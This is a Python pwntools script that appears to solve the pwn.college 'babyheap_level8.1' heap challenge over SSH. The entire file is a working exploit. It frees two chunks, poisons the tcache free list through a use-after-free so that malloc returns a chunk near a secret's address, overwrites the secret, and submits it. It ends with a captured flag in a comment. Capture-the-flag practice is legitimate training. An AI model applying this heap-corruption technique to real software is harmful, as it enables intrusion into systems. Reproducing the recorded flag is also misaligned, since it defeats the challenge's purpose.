from pwn import *

def _malloc(index, size):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())

def _free(index):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _scanf(index, data):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"scanf")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendline(data)

def _puts(index):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())

def _send_flag(sec):
    io.sendlineafter(b"[*] Function (malloc/free/puts/scanf/send_flag/quit): ", b"send_flag")
    io.sendlineafter(b"Secret: ", sec)

    io.interactive()

secret_pos = 0x42A70A
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level8.1")

_malloc(0, 128); _malloc(1, 128)
_free(1); _free(0)

_scanf(0, p64(secret_pos - 4))
_malloc(2, 128); _malloc(3, 128)

_scanf(3, b'a'*20)
_send_flag(b'a'*16)
# Flag: pwn.college{0ehQbh5UDD-1Qgr_lTQtULbxA2U.0lN4MDLxIjNyEzW}